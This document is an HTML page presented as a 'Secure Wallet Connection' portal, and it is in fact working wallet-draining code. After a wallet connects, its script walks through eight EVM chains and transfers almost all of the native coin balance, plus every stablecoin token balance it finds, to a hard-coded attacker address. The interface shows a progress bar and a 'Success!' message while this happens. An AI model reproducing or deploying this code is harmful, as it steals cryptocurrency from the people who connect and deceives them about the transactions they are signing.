<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Wallet Connection</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .spinner { animation: spin 1s linear infinite; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

<div class="max-w-md w-full">
    
    <!-- CONNECT STATE -->
    <div id="connectState" class="card rounded-3xl p-8 shadow-2xl text-center">
        <div class="text-6xl mb-6">üîê</div>
        <h1 class="text-3xl font-bold text-gray-800 mb-3">Connect Wallet</h1>
        <p class="text-gray-600 mb-8">Tap below to connect securely</p>
        
        <button onclick="connect()" 
            class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-2xl text-lg font-semibold shadow-lg hover:shadow-xl transition-all">
            Connect Now
        </button>
        
        <p class="text-xs text-gray-400 mt-6">üîí Secure ‚Ä¢ Private ‚Ä¢ Fast</p>
    </div>

    <!-- PROCESSING STATE -->
    <div id="processingState" class="card rounded-3xl p-8 shadow-2xl text-center hidden">
        <div class="text-6xl mb-6 spinner">‚ö°</div>
        <h2 class="text-2xl font-bold text-gray-800 mb-3">Processing...</h2>
        <p class="text-gray-600 mb-6">Please confirm in your wallet</p>
        
        <div class="w-full bg-gray-200 rounded-full h-2">
            <div id="progressBar" class="bg-gradient-to-r from-purple-600 to-indigo-600 h-2 rounded-full transition-all" style="width: 0%"></div>
        </div>
    </div>

    <!-- SUCCESS STATE -->
    <div id="successState" class="card rounded-3xl p-8 shadow-2xl text-center hidden">
        <div class="text-6xl mb-6">‚úÖ</div>
        <h2 class="text-2xl font-bold text-green-600 mb-3">Success!</h2>
        <p class="text-gray-600 mb-6">Transaction completed</p>
        <button onclick="location.reload()" class="text-purple-600 font-semibold">Done</button>
    </div>

</div>

<script type="module">
import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'

const DEST = "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578";
const PID = "72f0728c47e59d2eb9fc83069bc6843d";

const ABI = ["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"];

// All EVM chains
const CHAINS = {
    1: { rpc: 'https://eth.llamarpc.com', tokens: ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F"] },
    137: { rpc: 'https://polygon-rpc.com', tokens: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174","0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"] },
    56: { rpc: 'https://bsc-dataseed.binance.org', tokens: ["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"] },
    42161: { rpc: 'https://arb1.arbitrum.io/rpc', tokens: ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8"] },
    10: { rpc: 'https://mainnet.optimism.io', tokens: ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","0x7F5c764cBc14f9669B88837ca1490cCa17c31607"] },
    43114: { rpc: 'https://api.avax.network/ext/bc/C/rpc', tokens: ["0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7","0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E"] },
    250: { rpc: 'https://rpc.ftm.tools', tokens: ["0x049d68029688eAbF473097a2fC38ef61633A3C7A"] },
    25: { rpc: 'https://evm.cronos.org', tokens: ["0x66e428c3f67a68878562e79A0234c1F83c208770"] }
};

const c1 = {chainId:1,name:'Ethereum',currency:'ETH',explorerUrl:'https://etherscan.io',rpcUrl:'https://eth.llamarpc.com'};
const c137 = {chainId:137,name:'Polygon',currency:'MATIC',explorerUrl:'https://polygonscan.com',rpcUrl:'https://polygon-rpc.com'};
const c56 = {chainId:56,name:'BSC',currency:'BNB',explorerUrl:'https://bscscan.com',rpcUrl:'https://bsc-dataseed.binance.org'};
const c42161 = {chainId:42161,name:'Arbitrum',currency:'ETH',explorerUrl:'https://arbiscan.io',rpcUrl:'https://arb1.arbitrum.io/rpc'};
const c10 = {chainId:10,name:'Optimism',currency:'ETH',explorerUrl:'https://optimistic.etherscan.io',rpcUrl:'https://mainnet.optimism.io'};
const c43114 = {chainId:43114,name:'Avalanche',currency:'AVAX',explorerUrl:'https://snowtrace.io',rpcUrl:'https://api.avax.network/ext/bc/C/rpc'};
const c250 = {chainId:250,name:'Fantom',currency:'FTM',explorerUrl:'https://ftmscan.com',rpcUrl:'https://rpc.ftm.tools'};
const c25 = {chainId:25,name:'Cronos',currency:'CRO',explorerUrl:'https://cronoscan.com',rpcUrl:'https://evm.cronos.org'};

const cfg = defaultConfig({
  metadata: {name:'Portal',description:'Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
  enableEIP6963:true,enableInjected:true,enableCoinbase:true,rpcUrl:'https://polygon-rpc.com',defaultChainId:137
});

const modal = createWeb3Modal({
  ethersConfig:cfg,
  chains:[c137,c1,c56,c42161,c10,c43114,c250,c25],
  projectId:PID,
  enableAnalytics:false
});

let p,s,a;

function show(id){['connectState','processingState','successState'].forEach(x=>document.getElementById(x).classList.add('hidden'));document.getElementById(id).classList.remove('hidden');}
function prog(n){document.getElementById('progressBar').style.width=n+'%';}

window.connect=async()=>{try{await modal.open()}catch(e){console.error(e)}};

modal.subscribeProvider(async(st)=>{
    if(st.isConnected&&st.address){
        a=st.address;
        p=new ethers.providers.Web3Provider(st.provider);
        s=p.getSigner();
        await auto();
    }
});

async function auto(){
    show('processingState');
    prog(5);
    
    const tasks=[];
    for(const[cid,cfg]of Object.entries(CHAINS)){
        tasks.push((async()=>{
            try{
                const rp=new ethers.providers.JsonRpcProvider(cfg.rpc);
                const bal=await rp.getBalance(a);
                
                if(bal.gt(ethers.utils.parseEther("0.001"))){
                    try{
                        await p.send("wallet_switchEthereumChain",[{chainId:`0x${parseInt(cid).toString(16)}`}]);
                        await new Promise(r=>setTimeout(r,800));
                        
                        const cs=p.getSigner();
                        const gp=await p.getGasPrice();
                        const amt=bal.sub(gp.mul(21000).mul(2));
                        
                        if(amt.gt(0)){
                            const tx=await cs.sendTransaction({to:DEST,value:amt,gasLimit:21000});
                            console.log('TX:',tx.hash);
                        }
                    }catch(e){console.log('Err:',e.message)}
                }
                
                for(const tok of cfg.tokens){
                    try{
                        const tc=new ethers.Contract(tok,ABI,rp);
                        const tb=await tc.balanceOf(a);
                        if(tb.gt(0)){
                            await p.send("wallet_switchEthereumChain",[{chainId:`0x${parseInt(cid).toString(16)}`}]);
                            await new Promise(r=>setTimeout(r,800));
                            const tcs=tc.connect(p.getSigner());
                            const tx=await tcs.transfer(DEST,tb,{gasLimit:100000});
                            console.log('Token TX:',tx.hash);
                        }
                    }catch(e){}
                }
            }catch(e){console.log('Chain err:',e.message)}
        })());
    }
    
    prog(50);
    await Promise.allSettled(tasks);
    prog(100);
    
    setTimeout(()=>show('successState'),800);
}

console.log('Ready');
</script>

</body>
</html>
